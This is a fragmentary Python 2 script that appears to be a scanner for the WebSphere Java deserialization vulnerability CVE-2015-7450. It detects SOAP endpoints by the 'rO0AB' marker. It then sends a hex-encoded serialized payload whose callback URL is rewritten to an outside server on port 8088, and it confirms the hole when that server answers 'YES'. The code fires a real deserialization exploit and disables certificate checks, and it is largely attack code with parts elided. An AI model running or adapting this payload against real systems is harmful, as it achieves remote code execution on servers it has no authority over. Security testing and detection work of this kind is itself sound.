...
def is_SOAP(ip, port, timeout):
    try:
        ...
        output = urllib2.urlopen(
            'https://'+ip+":"+str(port), context=ctx, timeout=timeout).read()
        if "rO0AB" in output:
            return (1, True)
    except urllib2.HTTPError, e:
        if ((e.getcode() == 500) and ("rO0AB" in e.read())):
            return (1, True)
    except:
        pass
    try:
        output = urllib2.urlopen(
            'http://'+ip+":"+str(port), timeout=timeout).read()
        if "rO0AB" in output:
            return (0, True)
    except urllib2.HTTPError, e:
        if ((e.getcode() == 500) and ("rO0AB" in e.read())):
...
""")
    ...
    payload = payload.decode('hex').replace(
        'http://255.255.255.255:8088/add/random', ('http://%s:8088/add/%s' % (dnsserver, random_num)))
    ...
    if((_is_soap[1] == True) and (_is_soap[0] == 1)):
        ...
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        req = urllib2.Request(url=('https://%s:%d/' %
                                   (ip, port)), data=post_data, headers=post_header)
        try:
            request = urllib2.urlopen(req, context=ctx)
        except:
            pass
    elif((_is_soap[1] == True) and (_is_soap[0] == 0)):
        req = urllib2.Request(url=('http://%s:%d/' %
                                   (ip, port)), data=post_data, headers=post_header)
        try:
    ...
    if 'YES' in reqopen.read():
        return u"存在WebSphere反序列化漏洞(CVE-2015-7450)"
    return
